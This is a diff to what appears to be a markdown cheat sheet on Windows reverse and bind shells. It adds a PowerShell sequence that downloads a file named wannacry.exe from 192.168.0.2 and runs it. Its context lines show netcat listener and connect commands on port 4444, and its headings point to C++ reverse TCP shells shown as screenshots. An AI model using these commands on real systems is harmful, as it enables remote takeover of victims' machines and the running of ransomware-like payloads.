@@ -65,8 +65,19 @@ $netcat -v -l -p 4444
 ```
 $netcat -v victim_ip 4444
 ```
+### Win <= 7 Bind reverse shell \[ powershell.exe \]
 
-### Reverse Tcp With CPP 
+<img src="https://zupimages.net/up/19/01/wq32.png">
+
+```
+>dir env:\
+> $url=http://192.168.0.2/wannacry.exe
+> wget $url -outfile [ PATH ]
+> cmd
+> start File
+```
+
+### Reverse Tcp With CPP \[ cmd.exe \] 
 
 Write on an ide really basic devcpp on windows
 
@@ -75,7 +86,7 @@ Write on an ide really basic devcpp on windows
 <img src="https://zupimages.net/up/18/52/3s63.png">
 <img src="https://zupimages.net/up/18/52/y6mk.png">
 
-### Win 10 pro reverse cpp
+### Win 10 pro reverse cpp \[ cmd.exe \]
 
 <img src="https://zupimages.net/up/18/52/ztqp.png">
 <img src="https://zupimages.net/up/18/52/dt6r.png">
